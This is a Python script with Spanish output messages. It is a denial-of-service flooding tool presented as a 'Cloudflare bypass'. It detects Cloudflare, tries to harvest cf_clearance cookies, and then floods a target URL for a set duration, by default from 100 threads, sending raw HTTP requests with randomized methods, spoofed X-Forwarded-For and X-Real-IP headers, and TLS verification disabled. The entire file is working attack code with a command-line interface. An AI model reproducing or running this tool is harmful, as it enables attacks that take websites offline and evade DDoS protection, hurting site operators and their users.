#!/usr/bin/env python3
import random
import socket
import ssl
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from urllib.parse import urlparse

import requests
from colorama import Fore, init
from fake_useragent import UserAgent
init(autoreset=True)

class CloudflareBypass:
    def __init__(self, target_url, threads=100, duration=60):
        self.target_url = target_url
        self.threads = threads
        self.duration = duration
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.netloc
        self.path = self.parsed_url.path or "/"
        self.is_https = self.parsed_url.scheme == "https"
        self.port = 443 if self.is_https else 80
        self.ua = UserAgent()
        self.cf_clearance = None
        self.user_agent = None
        self.cookies = {}
        
        self.check_cloudflare()
      
        self.get_cf_clearance()
    
    def check_cloudflare(self):
        try:
            headers = {"User-Agent": self.ua.chrome}
            response = requests.get(self.target_url, headers=headers, timeout=10)
            
            if "cloudflare" in response.headers.get("server", "").lower():
                print(f"{Fore.YELLOW}[!] El objetivo está protegido por Cloudflare")
                if "cf-chl-bypass" in response.text.lower():
                    print(f"{Fore.RED}[!] Cloudflare Challenge detectado")
                return True
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error al verificar Cloudflare: {e}")
            return False
    
    def get_cf_clearance(self):
        print(f"{Fore.CYAN}[*] Intentando obtener cookies de bypass...")
        try:
            session = requests.Session()
            headers = {
                "User-Agent": self.ua.chrome,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
            }
            
           
            response = session.get(self.target_url, headers=headers, timeout=15)
            
            if "cf_clearance" in session.cookies:
                self.cf_clearance = session.cookies["cf_clearance"]
                self.user_agent = headers["User-Agent"]
                self.cookies = {
                    "cf_clearance": self.cf_clearance,
                    "__cf_bm": session.cookies.get("__cf_bm", ""),
                }
                print(f"{Fore.GREEN}[+] Cookies obtenidas con éxito!")
                print(f"{Fore.GREEN}[+] User-Agent: {self.user_agent}")
                print(f"{Fore.GREEN}[+] cf_clearance: {self.cf_clearance}")
                return True
            
            print(f"{Fore.RED}[-] No se pudo obtener cf_clearance")
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error al obtener cookies: {e}")
            return False
    
    def create_ssl_context(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if self.is_https:
                context = self.create_ssl_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            return sock
        except Exception as e:
            print(f"{Fore.RED}[!] Error al crear socket: {e}")
            return None
    
    def generate_payload(self):
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"]
        method = random.choice(methods)
        
        headers = {
            "Host": self.host,
            "User-Agent": self.user_agent or self.ua.chrome,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        }
        
        if self.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            headers["Cookie"] = cookie_str
        
        extra_headers = {
            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "X-Requested-With": "XMLHttpRequest",
            "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "Referer": f"https://{self.host}/",
            "Origin": f"https://{self.host}",
        }
        
    
        for _ in range(random.randint(1, 3)):
            headers.update(random.sample(extra_headers.items(), 1))
        
    
        request = f"{method} {self.path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"
        
        return request.encode()
    
    def attack(self):
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < self.duration:
            try:
                sock = self.create_socket()
                if not sock:
                    continue
                
                payload = self.generate_payload()
                sock.sendall(payload)
                
                try:
                    sock.recv(1024)
                except:
                    pass
                
                request_count += 1
                sock.close()
                
            except Exception as e:
                continue
        
        return request_count
    
    def start(self):
        print(f"{Fore.CYAN}[*] Iniciando ataque a {self.target_url}")
        print(f"{Fore.CYAN}[*] Duración: {self.duration} segundos")
        print(f"{Fore.CYAN}[*] Hilos: {self.threads}")
        
        total_requests = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.attack) for _ in range(self.threads)]
            
            for future in futures:
                total_requests += future.result()
        
        end_time = time.time()
        elapsed = end_time - start_time
        rps = total_requests / elapsed if elapsed > 0 else 0
        
        print(f"{Fore.GREEN}[+] Ataque completado!")
        print(f"{Fore.GREEN}[+] Total de solicitudes: {total_requests}")
        print(f"{Fore.GREEN}[+] Solicitudes por segundo: {rps:.2f}")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Herramienta de bypass para Cloudflare")
    parser.add_argument("url", help="URL objetivo (incluye http:// o https://)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Número de hilos (por defecto: 100)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duración del ataque en segundos (por defecto: 60)")
    
    args = parser.parse_args()
    
    attacker = CloudflareBypass(args.url, args.threads, args.duration)
    attacker.start()
